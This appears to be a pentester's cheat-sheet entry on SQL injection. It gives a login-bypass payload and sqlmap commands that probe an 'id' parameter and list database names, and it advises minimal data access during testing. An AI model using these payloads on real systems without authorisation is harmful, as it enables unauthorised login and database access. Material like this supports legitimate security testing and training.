#### SQL Injection

A SQL injection attack consists of inserting SQL statements on a SQL query via the input data from the client to the application.

##### Login Bypass
```
' or '1'='1 -- -
```

###### sqlmap
sqlmap can be used to automatically exploit and detect SQL injection vulnerabilities.
Keep in mind that you should only access the least amount of data to prove the existence of a SQL injection.

Test `id` parameter from burp request file:
```
sqlmap -r /home/user/sqli.req.txt -p id --level 5 --risk 2
```

Read the database names (this should be enough to prove SQL injection without reading sensitive customer data)
```
sqlmap -r /home/user/sqli.req.txt -p id --dbs
```


